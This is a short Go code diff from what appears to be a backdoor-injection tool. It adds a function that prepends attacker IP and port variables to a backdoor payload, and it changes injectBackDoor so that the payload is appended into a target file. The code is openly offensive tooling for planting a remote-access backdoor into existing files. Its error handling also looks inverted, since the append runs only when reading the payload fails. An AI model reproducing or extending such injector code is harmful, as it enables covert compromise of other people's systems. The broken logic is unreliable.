@@ -1,11 +1,16 @@
 package internals
 
 import (
+	"fmt"
 	"strings"
 
 	"data"
 	"utils"
 )
+
+func addAddress(addr data.Address, file *string) {
+	*file = "$IP='" + addr.Ip + "';$PORT=" + fmt.Sprintf("%d", addr.Port) + *file
+}
 
 func findModuleName(path string) string {
 	var pathSplitted []string = strings.Split(path, "/")
@@ -27,6 +32,7 @@ func Inject(addr data.Address, path string) error {
 func injectBackDoor(addr data.Address, filePath string, backdoorPath string) error {
 	backdoor, err := utils.ReadFile(backdoorPath)
 	if err != nil {
+		addAddress(addr, &backdoor)
 		err = utils.AppendToFile(backdoor, filePath)
 	}
 
